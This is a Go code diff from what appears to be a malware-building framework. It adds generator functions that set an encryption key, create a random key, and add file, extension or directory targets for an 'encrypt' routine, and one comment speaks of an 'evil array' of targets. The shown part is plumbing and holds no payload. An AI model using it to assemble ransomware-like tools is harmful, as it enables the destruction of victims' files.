@@ -11,7 +11,8 @@ import (
 //
 //
 // Encrypts the provided object
-// The input must follow this format '${"<encryption system>", "<key>", "<file/ext/dir>", "<path/to/object>"}$'
+// The input can follow this format '${"<encryption system>", "<key>", "<'file'/'ext'/'dir'>", "<object>"}$'
+// following the above format will "overwrite" all values in the struct before encrypting
 //
 //
 func encrypt(value string, s_json string) string {
@@ -54,24 +55,61 @@ func set_crypto(value string, s_json string) ([]string, string) {
 
 //
 //
+// Sets the key used for encrypting
 //
 //
-//
-func set_key(value string, s_json string) string {
+func set_key(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 
-	return structure.Send(data_object)
+	system_call := "set_key"
+	value = tools.Erase_delimiter(value, []string{"\""}, -1)
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", system_call),
+		fmt.Sprintf("spine.crypt.set_key(\"%s\")", value),
+		"}"})
+
+	return []string{fmt.Sprintf("%s()", system_call)}, structure.Send(data_object)
 }
 
 //
 //
+// Generates a key used for encrypting/decrypting
 //
 //
+func generate_key(value string, s_json string) ([]string, string) {
+	value = tools.Erase_delimiter(value, []string{"\""}, -1)
+
+	key_size := tools.String_to_int(value)
+
+	if key_size == -1 {
+		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", value), "crypto.generate_key()")
+	}
+
+	key := tools.Generate_random_n_string(key_size)
+
+	calls, s_json := set_key(key, s_json)
+
+	return calls, s_json
+}
+
 //
-func set_target(value string, s_json string) string {
+//
+// Appends a target to focus on, you can also pass in a evil array with all your targets aswell
+//
+//
+func add_target(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 
-	return structure.Send(data_object)
+	system_call := "add_target"
+	value = tools.Erase_delimiter(value, []string{"\""}, -1)
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(target string){", system_call),
+		"spine.crypt.add_target(target)",
+		"}"})
+
+	return []string{fmt.Sprintf("%s(\"%s\")", system_call, value)}, structure.Send(data_object)
 }
 
 //
